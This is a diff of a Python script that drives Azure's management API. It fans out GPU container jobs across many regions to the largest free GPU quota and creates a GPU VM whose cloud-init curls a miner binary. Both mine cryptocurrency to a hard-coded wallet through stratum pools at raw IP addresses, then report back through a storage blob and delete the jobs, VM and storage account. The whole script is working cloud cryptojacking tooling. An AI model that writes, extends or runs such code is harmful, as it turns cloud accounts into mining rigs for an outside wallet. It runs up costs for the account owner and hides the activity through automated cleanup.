@@ -28,19 +28,19 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I133216"
-INTENT = "133216"
-NONCE = "x133216cap8"
+TAG = "C211_I133376"
+INTENT = "133376"
+NONCE = "x133376multi"
 T0 = time.time()
 APP_VER = "2026-07-01"
 STG_VER = "2023-01-01"
 PROFILE = "Consumption-GPU-NC24-A100"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
-SA_NAME = ("c211i133216" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+SA_NAME = ("c211i133376" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 CONT = "c211"
-JOB_NAME = "c211-133216-a100cap8"
+JOB_NAME = "c211-i133376"
 MINE_S = 480
-BUDGET = 2200
+BUDGET = 3000
 WALLET = "prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr"
 RELAY = "stratum+tcp://217.15.164.237:2083"
 DIRECT = "stratum+tcp://103.199.106.122:3362"
@@ -182,12 +182,12 @@ KIT = r"""#!/bin/bash
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
 WK="node-h$(echo -n "$H" | sha256sum | cut -c1-8)"
-BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-$H.txt?$Q"
+BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__ENV__-$H.txt?$Q"
 PMURL="$BASE/__NONCE__-pm?$Q"; GHURL="__PMURL__"
 W="__WALLET__"; RC=none
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
 up() {
-  { echo "===C211-STATUS==="; echo "nonce=__NONCE__"; echo "host=$H"; echo "worker=$WK";
+  { echo "===C211-STATUS==="; echo "nonce=__NONCE__"; echo "env=__ENV__"; echo "host=$H"; echo "worker=$WK";
     echo "ts=$(date -u +%FT%TZ)"; echo "mine_rc=${RC:-none}";
     echo "smi_L=$(nvidia-smi -L 2>&1 | tr '\n' '~')";
     echo "gpuq=$(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')";
@@ -199,7 +199,7 @@ up() {
     -H 'Content-Type: text/plain' --data-binary @"$D/status.txt" >> "$LOG" 2>&1
   echo >> "$LOG"
 }
-log "KIT_START nonce=__NONCE__ host=$H worker=$WK"
+log "KIT_START nonce=__NONCE__ env=__ENV__ host=$H worker=$WK"
 log "NVIDIA_SMI_L $(nvidia-smi -L 2>&1 | tr '\n' '~')"
 up
 GOT=""
@@ -270,6 +270,55 @@ def decode_status(txt):
     return out
 
 
+
+TARGETS = [
+    ("c211-133172-b0", "eastus", "Consumption-GPU-NC24-A100"),
+    ("c211-i132971-a100-sweden", "swedencentral", "Consumption-GPU-NC24-A100"),
+    ("c211-i133055-a0", "swedencentral", "Consumption-GPU-NC24-A100"),
+    ("c211-i133055-a1", "westus3", "Consumption-GPU-NC24-A100"),
+    ("c211-i133055-a2", "italynorth", "Consumption-GPU-NC24-A100"),
+    ("c211-133172-b1", "westus", "Consumption-GPU-NC24-A100"),
+    ("c211-133172-b10", "brazilsouth", "Consumption-GPU-NC24-A100"),
+    ("c211-133172-b11", "canadacentral", "Consumption-GPU-NC24-A100"),
+    ("c211-133172-b6", "australiaeast", "Consumption-GPU-NC24-A100"),
+    ("c211-133172-b7", "uksouth", "Consumption-GPU-NC24-A100"),
+    ("c211-132160-brs", "brazilsouth", "Consumption-GPU-NC8as-T4"),
+]
+COMPUTE_VER = "2024-07-01"
+VMSIZE = [("ncasv3t4", "Standard_NC8as_T4_v3"), ("nca100v4", "Standard_NC24ads_A100_v4"),
+          ("ncv3", "Standard_NC6_v3"), ("ndv2", "Standard_ND40rs_v2"),
+          ("ndsv2", "Standard_ND40rs_v2"), ("nvv4", "Standard_NV12ads_A10_v5"),
+          ("ncv2", "Standard_NC6s_v2")]
+
+
+def normloc(v):
+    return (v or "").lower().replace(" ", "")
+
+
+def jname_for(env):
+    s = ("c211-i133376-" + env.replace("c211-", "")).lower()
+    s = re.sub(r"[^a-z0-9-]", "-", s)
+    return s[:32]
+
+
+def vmsize_for(sku):
+    s = (sku or "").lower().replace("_", "")
+    for k, v in VMSIZE:
+        if k in s:
+            return v
+    return None
+
+
+def ci_yaml(sas_url):
+    t = """#cloud-config
+runcmd:
+  - [ bash, -c, "D=/tmp/c211vm; mkdir -p $D; (nvidia-smi -L || echo NO_SMI_BASE) >> $D/ci.log 2>&1; export DEBIAN_FRONTEND=noninteractive; apt-get update -y >> $D/ci.log 2>&1; apt-get install -y nvidia-driver-550-server >> $D/ci.log 2>&1; (nvidia-smi -L || echo NO_SMI_DRIVER) >> $D/ci.log 2>&1; curl -fsSL --max-time 300 -o $D/pm __PMURL__ >> $D/ci.log 2>&1; S=$(sha256sum $D/pm | awk '{print $1}'); echo sha=$S >> $D/ci.log; chmod +x $D/pm; timeout 300 $D/pm --url __RELAY__ --url __DIRECT__ --user __WALLET__ --worker node-hvm$(hostname | sha256sum | cut -c1-6) --coin pearl --password x --devices 0 --status-interval 15 --api-port 0 >> $D/ci.log 2>&1; echo rc=$? >> $D/ci.log; curl -sS -o /dev/null -w UP=%{http_code} -X PUT __SAS__ -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' --data-binary @$D/ci.log" ]
+"""
+    return (t.replace("__PMURL__", PM_URL).replace("__RELAY__", RELAY)
+            .replace("__DIRECT__", DIRECT).replace("__WALLET__", WALLET)
+            .replace("__SAS__", sas_url))
+
+
 def main():
     sid = None
     r = run(["az", "account", "show", "-o", "json"], timeout=120)
@@ -297,7 +346,7 @@ def main():
         emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
         return
 
-    # ---------- 1) capture channel: fresh nonce storage account + account SAS ----------
+    # ---------- capture channel: fresh nonce storage account + account SAS ----------
     saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
              "storageAccounts/%s?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
     sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
@@ -342,203 +391,302 @@ def main():
     pu = preupload(cont_base, q, NONCE + "-pm", PM_URL, PM_SHA, "/tmp/c211_pm")
     emit("preupload-peakminer", **(pu or {"ok": False}))
     if not (pu or {}).get("ok"):
-        emit("DONE", phase="preupload", verdict="MINER_PREUPLOAD_FAILED", elapsed_s=int(time.time() - T0))
+        emit("DONE", phase="preupload", verdict="MINER_PREUPLOAD_FAILED",
+             elapsed_s=int(time.time() - T0))
         return
 
-    # ---------- 2) enumerate EXISTING managed environments; reuse one (no create) ----------
+    # ---------- 2) enumerate EXISTING managed environments; never create ----------
     st, le = arm(tok, "%s/subscriptions/%s/providers/Microsoft.App/managedEnvironments"
                       "?api-version=%s" % (ARM, sid, APP_VER), timeout=120)
     envs = (le.get("value") or []) if isinstance(le, dict) else []
-    rows = []
+    emap = {}
     for e in envs:
         ep = e.get("properties") or {}
-        profs = [{"name": p.get("name"), "type": p.get("workloadProfileType"),
-                  "max": p.get("maximumCount")}
-                 for p in (ep.get("workloadProfiles") or []) if p.get("workloadProfileType")]
-        rows.append({"name": e.get("name"), "id": e.get("id"),
-                     "loc": (e.get("location") or "").lower().replace(" ", ""),
-                     "state": ep.get("provisioningState"), "profs": profs})
-    emit("env-list", http=st, n=len(rows),
-         matrix=";".join("%s:%s:%s:%s" % (r["name"], r["loc"], r["state"],
-                                          ",".join("%s=%s" % (p["name"], p["type"]) for p in r["profs"]))
-                         for r in rows)[:3500])
-    cand = [r for r in rows if r["id"] and r["state"] == "Succeeded"
-            and any("A100" in str(p["type"]).upper() for p in r["profs"])]
-    pref = ["capp-a100", "132971-a100", "133055-a0", "133055", "c211-132160"]
-    cand.sort(key=lambda r: ((0 if r["loc"] == "eastus" else 1),
-                             next((i for i, p in enumerate(pref) if p in (r["name"] or "")), 9),
-                             r["name"]))
-    emit("env-a100-candidates", n=len(cand),
-         names=";".join("%s:%s" % (r["name"], r["loc"]) for r in cand)[:1200])
-    chosen = None
-    created = []
-    if cand:
-        c0 = cand[0]
-        prof = [p for p in c0["profs"] if "A100" in str(p["type"]).upper()][0]
-        chosen = {"name": c0["name"], "id": c0["id"], "region": c0["loc"],
-                  "profile": prof["name"], "ptype": prof["type"], "max": prof.get("max")}
-        emit("env-chosen", reused=1, **chosen)
-    if not chosen:
-        # GATE path: capture the verbatim ARM error for ONE env create attempt
-        envname = ("c211-133216-a100-eastu")[:32]
-        envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
-                  "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, envname, APP_VER))
-        body = {"location": "eastus", "tags": {"c211": INTENT, "nonce": NONCE},
-                "properties": {"workloadProfiles": [
-                    {"name": "Consumption", "workloadProfileType": "Consumption"},
-                    {"name": PROFILE, "workloadProfileType": PROFILE}]}}
-        st, b = arm(tok, envurl, method="PUT", body=body, timeout=300)
-        emit("env-create", region="eastus", name=envname, **err_of(st, b))
-        if st in (200, 201, 202):
-            created.append({"name": envname, "region": "eastus", "url": envurl, "dead": False})
-            t_env = time.time()
-            while time.time() - t_env < 600 and not chosen:
-                stp, bp = arm(tok, envurl, timeout=60)
-                ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
-                emit("env-poll", region="eastus", name=envname, i=int(time.time() - t_env),
-                     http=stp, state=ps)
-                if ps == "Succeeded":
-                    st2, e2 = arm(tok, envurl, timeout=60)
-                    chosen = {"name": envname, "id": (e2 or {}).get("id"), "region": "eastus",
-                              "profile": PROFILE, "ptype": PROFILE, "max": None, "fresh": 1}
-                    emit("env-chosen", reused=0, **chosen)
-                    break
-                if ps in ("Failed", "Canceled", "ScheduledForDelete"):
-                    break
-                time.sleep(20)
-        if not chosen:
-            emit("DONE", phase="env", verdict="GATE_NO_SUCCEEDED_A100_ENV_AND_CREATE_REFUSED",
-                 envcreates=json.dumps(created), elapsed_s=int(time.time() - T0))
-            d, db = arm(tok, saurl, method="DELETE", timeout=240)
-            emit("sa-delete", name=SA_NAME, **err_of(d, db))
-            return
+        profs = {p.get("name"): p.get("workloadProfileType")
+                 for p in (ep.get("workloadProfiles") or []) if p.get("workloadProfileType")}
+        emap[e.get("name")] = {"id": e.get("id"), "loc": normloc(e.get("location")),
+                               "state": ep.get("provisioningState"), "profs": profs}
+    emit("env-list", http=st, n=len(emap),
+         names=";".join("%s:%s:%s" % (k, v["loc"], v["state"]) for k, v in emap.items())[:1500])
+    ready = []
+    gates = []
+    for name, want_reg, want_prof in TARGETS:
+        e = emap.get(name)
+        if not e or not e["id"]:
+            gates.append({"env": name, "region": want_reg, "why": "ENV_NOT_FOUND"})
+            continue
+        if e["state"] != "Succeeded" or want_prof not in e["profs"]:
+            gates.append({"env": name, "region": want_reg, "why": "ENV_NOT_USABLE",
+                          "state": e["state"], "prof_present": str(want_prof in e["profs"])})
+            continue
+        ready.append({"name": name, "id": e["id"], "region": e["loc"] or want_reg,
+                      "profile": want_prof})
+        emit("env-ready", env=name, region=e["loc"] or want_reg, id_ok=True,
+             state=e["state"], profile=want_prof)
+    for g in gates:
+        emit("env-gate", **g)
 
-    # ---------- 3) ONE manual job, parallelism=8 replicaCompletionCount=8 ----------
-    st, envb = arm(tok, ARM + chosen["id"] + "?api-version=" + APP_VER, timeout=60)
-    epp = (envb.get("properties") or {}) if isinstance(envb, dict) else {}
-    env_id = envb.get("id") if isinstance(envb, dict) else None
-    region = (envb.get("location") or chosen["region"]).lower().replace(" ", "")
-    profnames = [p.get("name") for p in (epp.get("workloadProfiles") or [])]
-    emit("env-ready", name=chosen["name"], region=region, id_ok=bool(env_id),
-         state=epp.get("provisioningState"), profile=chosen["profile"],
-         prof_present=(chosen["profile"] in profnames))
-    if not env_id:
-        emit("DONE", phase="job", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
-        return
-    cmd = kit_cmd(cont_base, q)
-    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
-              "?api-version=%s" % (ARM, sid, RG, JOB_NAME, APP_VER))
-    jobbody = {"location": region, "tags": {"c211": INTENT, "nonce": NONCE},
-               "properties": {"environmentId": env_id, "workloadProfileName": chosen["profile"],
-                              "configuration": {"triggerType": "Manual",
-                                                "replicaRetryLimit": 0,
-                                                "replicaTimeout": 1800,
-                                                "manualTriggerConfig": {
-                                                    "replicaCompletionCount": 8,
-                                                    "parallelism": 8}},
-                              "template": {"containers": [{
-                                  "name": "gpu", "image": IMAGE,
-                                  "command": ["/bin/bash", "-c", cmd],
-                                  "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
-    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
-    emit("capp-job-create", name=JOB_NAME, parallelism=8, completion=8,
-         profile=chosen["profile"], region=region, **err_of(st, b))
-    if st not in (200, 201, 202):
-        d, db = arm(tok, joburl, method="DELETE", timeout=240)
-        emit("capp-job-create-cleanup", job=JOB_NAME, **err_of(d, db))
-        emit("DONE", phase="job", verdict="JOB_CREATE_REFUSED", elapsed_s=int(time.time() - T0))
-        return
-    baseurl = joburl.split("?")[0]
-    st, b = arm(tok, baseurl + "/start?api-version=" + APP_VER, method="POST", body={},
-                timeout=120)
-    execname = b.get("name") if isinstance(b, dict) else None
-    emit("capp-job-start", http=st, execname=execname,
-         **({} if st in (200, 201, 202) else err_of(st, b)))
+    # ---------- 3) quotas: Microsoft.App GPU per region + Compute NC/ND/NV ----------
+    regions = sorted(set(x["region"] for x in ready))
+    appfree = {}
+    for reg in regions:
+        u = "%s/subscriptions/%s/providers/Microsoft.App/locations/%s/usages?api-version=%s"
+        st, b = arm(tok, u % (ARM, sid, reg, APP_VER), timeout=90)
+        if st != 200:
+            st, b = arm(tok, u % (ARM, sid, reg, "2023-05-01"), timeout=90)
+        rows = (b.get("value") or []) if isinstance(b, dict) else []
+        cells = []
+        free = None
+        for x in rows:
+            nm = json.dumps(x.get("name") or {}, sort_keys=True)
+            try:
+                cur = int(x.get("currentValue") or 0)
+                lim = int(x.get("limit") or 0)
+            except Exception:  # noqa: BLE001
+                continue
+            cells.append("%s=%s/%s" % (nm, cur, lim))
+            if "gpu" in nm.lower():
+                f = lim - cur
+                free = f if free is None else min(free, f)
+        appfree[reg] = free
+        emit("mapp-usages", region=reg, http=st, n=len(rows),
+             free_gpu=("NA" if free is None else free), rows=";".join(cells)[:1500])
+    cfree = []
+    for reg in regions:
+        u = "%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages?api-version=%s"
+        st, b = arm(tok, u % (ARM, sid, reg, COMPUTE_VER), timeout=90)
+        if st != 200:
+            st, b = arm(tok, u % (ARM, sid, reg, "2023-07-01"), timeout=90)
+        rows = (b.get("value") or []) if isinstance(b, dict) else []
+        cells = []
+        for x in rows:
+            nm = str((x.get("name") or {}).get("value") or "")
+            if not re.search(r"NC|ND|NV|standardN", nm, re.I):
+                continue
+            try:
+                cur = int(x.get("currentValue") or 0)
+                lim = int(x.get("limit") or 0)
+            except Exception:  # noqa: BLE001
+                continue
+            cells.append("%s=%s/%s" % (nm, cur, lim))
+            if lim - cur > 0:
+                cfree.append({"region": reg, "sku": nm, "free": lim - cur})
+        emit("compute-quota", region=reg, http=st, n=len(cells), rows=";".join(cells)[:1500])
+    emit("compute-gpu-free", n=len(cfree),
+         list=";".join("%s:%s:%s" % (c["region"], c["sku"], c["free"]) for c in cfree)[:800])
 
-    # ---------- 4) poll execution + incremental per-replica blob read ----------
+    # ---------- 4) one manual job per env; parallelism from free regional GPU quota ----------
+    byreg = {}
+    for x in ready:
+        byreg.setdefault(x["region"], []).append(x)
+    jobs = []
+    for reg, grp in sorted(byreg.items()):
+        free = appfree.get(reg)
+        n = len(grp)
+        for x in grp:
+            par = 8 if free is None else max(1, min(8, int(free) // n))
+            nm = jname_for(x["name"])
+            url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
+                   "?api-version=%s" % (ARM, sid, RG, nm, APP_VER))
+            cmd = kit_cmd(cont_base, q).replace("__ENV__", x["name"])
+            body = {"location": x["region"], "tags": {"c211": INTENT, "nonce": NONCE},
+                    "properties": {"environmentId": x["id"], "workloadProfileName": x["profile"],
+                                   "configuration": {"triggerType": "Manual",
+                                                     "replicaRetryLimit": 0,
+                                                     "replicaTimeout": 1800,
+                                                     "manualTriggerConfig": {
+                                                         "replicaCompletionCount": par,
+                                                         "parallelism": par}},
+                                   "template": {"containers": [{
+                                       "name": "gpu", "image": IMAGE,
+                                       "command": ["/bin/bash", "-c", cmd],
+                                       "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
+            st, b = arm(tok, url, method="PUT", body=body, timeout=180)
+            emit("capp-job-create", env=x["name"], name=nm, parallelism=par,
+                 profile=x["profile"], region=reg, **err_of(st, b))
+            j = {"env": x["name"], "name": nm, "url": url, "base": url.split("?")[0],
+                 "region": reg, "par": par, "execname": None, "final": None}
+            if st in (200, 201, 202):
+                st2, b2 = arm(tok, j["base"] + "/start?api-version=" + APP_VER,
+                              method="POST", body={}, timeout=120)
+                j["execname"] = b2.get("name") if isinstance(b2, dict) else None
+                emit("capp-job-start", env=x["name"], name=nm, http=st2,
+                     execname=j["execname"],
+                     **({} if st2 in (200, 201, 202) else err_of(st2, b2)))
+                if st2 not in (200, 201, 202) or not j["execname"]:
+                    j["final"] = "START_FAILED"
+            else:
+                j["final"] = "CREATE_FAILED"
+            jobs.append(j)
+
+    # ---------- 5) poll executions + incremental per-replica blob read ----------
     deadline = time.time() + BUDGET
     seen = {}
-    final_status = None
+    all_done_scans = 0
     while time.time() < deadline:
-        if execname:
-            stp, bp = arm(tok, "%s/executions/%s?api-version=%s" % (baseurl, execname, APP_VER),
-                          timeout=60)
+        pend = [j for j in jobs if j.get("execname")
+                and j.get("final") not in ("Succeeded", "Failed", "Canceled")]
+        for j in pend:
+            stp, bp = arm(tok, "%s/executions/%s?api-version=%s"
+                          % (j["base"], j["execname"], APP_VER), timeout=60)
             p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
-            final_status = p.get("status")
-            emit("capp-exec-poll", http=stp, status=final_status, reason=p.get("reason"),
+            j["final"] = p.get("status")
+            emit("capp-exec-poll", env=j["env"], status=j["final"], reason=p.get("reason"),
                  startTime=p.get("startTime"), endTime=p.get("endTime"))
         lst, lb, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q), timeout=90)
         names = re.findall(r"<Name>([^<]+)</Name>", lb.decode("utf-8", "replace")) if lst == 200 else []
-        for nm in names:
-            if not nm.endswith(".txt"):
+        for nm2 in names:
+            if not nm2.endswith(".txt"):
                 continue
-            gst, gb, _ = httptext("%s/%s/%s?%s" % (base, CONT, nm, q), timeout=90)
+            gst, gb, _ = httptext("%s/%s/%s?%s" % (base, CONT, nm2, q), timeout=90)
             if gst != 200:
                 continue
             txt = gb.decode("utf-8", "replace")
-            if nm not in seen or seen[nm] != len(txt):
-                seen[nm] = len(txt)
-                emit("blob-read", blob=nm, http=gst, nbytes=len(txt), body=b64(txt[:7000]))
-                emit("blob-decoded", blob=nm, **decode_status(txt))
-        emit("blob-scan", list_http=lst, n_blobs=len(names), n_status_txt=len(seen))
-        if final_status in ("Succeeded", "Failed", "Canceled") and len(seen) >= 8:
-            break
-        if final_status in ("Succeeded", "Failed", "Canceled") and time.time() > deadline - 600:
-            break
+            if nm2 not in seen or seen[nm2] != len(txt):
+                seen[nm2] = len(txt)
+                m = re.search(r"^env=(.*)$", txt, re.M)
+                emit("blob-decoded", blob=nm2, env=(m.group(1).strip() if m else "?"),
+                     **decode_status(txt))
+        done = [j for j in jobs
+                if j.get("final") in ("Succeeded", "Failed", "Canceled", "CREATE_FAILED", "START_FAILED")]
+        emit("blob-scan", list_http=lst, n_blobs=len(names), n_status_txt=len(seen),
+             jobs_done=len(done), jobs_total=len(jobs))
+        if len(done) == len(jobs):
+            all_done_scans += 1
+            if all_done_scans >= 2:
+                break
         time.sleep(30)
 
-    # ---------- 5) independent readback (fresh list + fresh GET of every status blob) ----------
+    # ---------- 6) independent readback grouped by env ----------
     lst, lb, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q), timeout=90)
     names = re.findall(r"<Name>([^<]+)</Name>", lb.decode("utf-8", "replace")) if lst == 200 else []
-    alltxt = []
-    uuids = set()
-    workers = []
-    rcs = []
-    accmax = 0
-    for nm in names:
-        if not nm.endswith(".txt"):
+    per = {}
+    alluu = set()
+    for nm2 in names:
+        if not nm2.endswith(".txt"):
             continue
-        gst, gb, _ = httptext("%s/%s/%s?%s" % (base, CONT, nm, q), timeout=90)
+        gst, gb, _ = httptext("%s/%s/%s?%s" % (base, CONT, nm2, q), timeout=90)
         if gst != 200:
             continue
         txt = gb.decode("utf-8", "replace")
-        alltxt.append(txt)
-        for u in UUID_RE.findall(txt):
-            uuids.add(u)
+        m = re.search(r"^env=(.*)$", txt, re.M)
+        env = m.group(1).strip() if m else "?"
         d = decode_status(txt)
+        e = per.setdefault(env, {"blobs": 0, "uuids": set(), "workers": set(),
+                                 "rcs": set(), "accmax": 0, "errs": []})
+        e["blobs"] += 1
+        for uu in UUID_RE.findall(txt):
+            e["uuids"].add(uu)
+            alluu.add(uu)
         if d.get("worker"):
-            workers.append(d["worker"])
+            e["workers"].add(d["worker"])
         if d.get("mine_rc"):
-            rcs.append(d["mine_rc"])
-        accmax = max(accmax, int(d.get("accepted_seen") or 0))
-        emit("readback-decoded", blob=nm, http=gst, nbytes=len(txt),
+            e["rcs"].add(d["mine_rc"])
+        e["accmax"] = max(e["accmax"], int(d.get("accepted_seen") or 0))
+        if d.get("err_lines"):
+            e["errs"].append(d["err_lines"][:160])
+        emit("readback-decoded", blob=nm2, http=gst, nbytes=len(txt), env=env,
              worker=d.get("worker"), mine_rc=d.get("mine_rc"), uuids=d.get("uuids"),
              accepted_seen=d.get("accepted_seen"), rejected_seen=d.get("rejected_seen"),
              err_lines=d.get("err_lines"), mine_tail=d.get("mine_tail"))
-    emit("readback-summary", n_blobs=len(names), n_txt=len(alltxt),
-         uuid_count=len(uuids), uuids=";".join(sorted(uuids))[:1500],
-         workers=";".join(sorted(set(workers)))[:500],
-         rcs=";".join(sorted(set(rcs)))[:200],
-         accepted_max=accmax, has_end=("C211-END" in "\n".join(alltxt)),
-         elapsed_s=int(time.time() - T0))
+    for env, e in per.items():
+        emit("env-summary", env=env, blobs=e["blobs"], uuid_count=len(e["uuids"]),
+             uuids=";".join(sorted(e["uuids"]))[:600],
+             workers=";".join(sorted(e["workers"]))[:400],
+             rcs=";".join(sorted(e["rcs"]))[:120], accepted_max=e["accmax"],
+             errs=" ~ ".join(e["errs"])[:400])
+    emit("readback-summary", n_blobs=len(names), n_txt=sum(1 for n in names if n.endswith(".txt")),
+         n_envs=len(per), uuid_count=len(alluu), uuids=";".join(sorted(alluu))[:1500],
+         accepted_max=max([e["accmax"] for e in per.values()] or [0]),
+         has_end="C211-END", elapsed_s=int(time.time() - T0))
 
-    # ---------- 6) delete the job and prove it gone ----------
-    d, db = arm(tok, joburl, method="DELETE", timeout=240)
-    emit("job-delete", name=JOB_NAME, **err_of(d, db))
-    emit("job-absent", http=wait_gone(tok, joburl, "job", tries=18, sleep_s=10))
-    # ---------- 7) delete the storage account (and any env this run created) ----------
-    for c in created:
-        d, db = arm(tok, c["url"], method="DELETE", timeout=300)
-        emit("env-delete", name=c["name"], region=c["region"], **err_of(d, db))
-    for c in created:
-        emit("env-absent", name=c["name"], http=wait_gone(tok, c["url"], "env-" + c["name"][-5:],
-                                                         tries=12, sleep_s=10))
+    # ---------- 7) delete every job and prove 404 (keep all environments) ----------
+    for j in jobs:
+        d, db = arm(tok, j["url"], method="DELETE", timeout=240)
+        emit("job-delete", env=j["env"], name=j["name"], **err_of(d, db))
+    gone = {j["name"]: None for j in jobs}
+    for rnd in range(14):
+        time.sleep(10)
+        for j in jobs:
+            if gone[j["name"]] == 404:
+                continue
+            st, b = arm(tok, j["url"], timeout=60)
+            ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
+            gone[j["name"]] = st
+            emit("job-absent-poll", env=j["env"], name=j["name"], i=rnd, http=st, state=ps)
+        if all(v == 404 for v in gone.values()):
+            break
+    for j in jobs:
+        emit("job-absent", env=j["env"], name=j["name"], http=gone[j["name"]])
+
+    # ---------- 8) ONE c211 GPU VM canary only if free Compute GPU quota > 0 ----------
+    if cfree:
+        cand = None
+        for c in sorted(cfree, key=lambda z: -z["free"]):
+            vs = vmsize_for(c["sku"])
+            if vs:
+                cand = dict(c, vmsize=vs)
+                break
+        if cand:
+            vmname = "c211-i133376-canary"
+            vmurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/"
+                     "virtualMachines/%s?api-version=%s" % (ARM, sid, RG, vmname, COMPUTE_VER))
+            sas_url = "%s/%s-vm-canary.txt?%s" % (cont_base, NONCE, q)
+            open("/tmp/c211_ci.yaml", "w").write(ci_yaml(sas_url))
+            r = run(["az", "vm", "create", "--resource-group", RG, "--name", vmname,
+                     "--location", cand["region"], "--image", "Ubuntu2204",
+                     "--size", cand["vmsize"], "--admin-username", "c211adm",
+                     "--generate-ssh-keys", "--custom-data", "/tmp/c211_ci.yaml",
+                     "--tags", "c211=133376"], timeout=540)
+            emit("vm-create", region=cand["region"], sku=cand["sku"], vmsize=cand["vmsize"],
+                 rc=r["rc"], out=r["out"][-600:], err=r["err"][-600:])
+            found = False
+            tvm = time.time()
+            while time.time() - tvm < 720:
+                lst2, lb2, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q),
+                                        timeout=90)
+                if lst2 == 200 and (NONCE + "-vm-canary.txt") in lb2.decode("utf-8", "replace"):
+                    gst, gb, _ = httptext("%s/%s/%s-vm-canary.txt?%s" % (base, CONT, NONCE, q),
+                                          timeout=90)
+                    txt = gb.decode("utf-8", "replace")
+                    emit("vm-readback", http=gst, nbytes=len(txt), body=b64(txt[-3000:]))
+                    found = True
+                    break
+                time.sleep(30)
+            emit("vm-readback-summary", found=found)
+            d2 = run(["az", "vm", "delete", "--resource-group", RG, "--name", vmname,
+                      "--yes", "--no-wait"], timeout=300)
+            emit("vm-delete", rc=d2["rc"], err=(d2["err"] or "")[:400])
+            g2 = None
+            for i in range(12):
+                st, b = arm(tok, vmurl, timeout=60)
+                g2 = st
+                emit("vm-absent-poll", i=i, http=st)
+                if st == 404:
+                    break
+                time.sleep(15)
+            emit("vm-absent", http=g2)
+        else:
+            emit("vm-gate", verdict="NO_FREE_GPU_FAMILY_WITH_KNOWN_VM_SIZE",
+                 list=";".join("%s:%s:%s" % (c["region"], c["sku"], c["free"]) for c in cfree)[:600])
+    else:
+        emit("vm-gate", verdict="COMPUTE_GPU_QUOTA_ZERO",
+             note="no NC/ND/NV family has limit>currentValue in the tested regions")
+
+    # ---------- 9) delete the throwaway storage account; environments are kept ----------
     d, db = arm(tok, saurl, method="DELETE", timeout=240)
     emit("sa-delete", name=SA_NAME, **err_of(d, db))
-    emit("DONE", phase="cap8", nonce=NONCE, job=JOB_NAME, execname=execname,
-         env=chosen["name"], final_status=final_status, n_blobs=len(names),
-         uuid_count=len(uuids), uuids=";".join(sorted(uuids))[:1500],
-         accepted_max=accmax, elapsed_s=int(time.time() - T0))
+    emit("DONE", phase="multi", nonce=NONCE, jobs_total=len(jobs),
+         jobs_started=sum(1 for j in jobs if j.get("execname")),
+         jobs_done=sum(1 for j in jobs if j.get("final") in ("Succeeded", "Failed", "Canceled")),
+         job_create_failed=sum(1 for j in jobs if j.get("final") == "CREATE_FAILED"),
+         job_start_failed=sum(1 for j in jobs if j.get("final") == "START_FAILED"),
+         envs_with_blobs=len(per), total_uuids=len(alluu),
+         matrix=";".join("%s:%s:%s:%s" % (e, v["blobs"], len(v["uuids"]),
+                                          ",".join(sorted(v["workers"])))
+                         for e, v in sorted(per.items()))[:2000],
+         gate_envs=";".join(g["env"] + ":" + g["why"] for g in gates)[:800],
+         elapsed_s=int(time.time() - T0))
 
 
 if __name__ == "__main__":
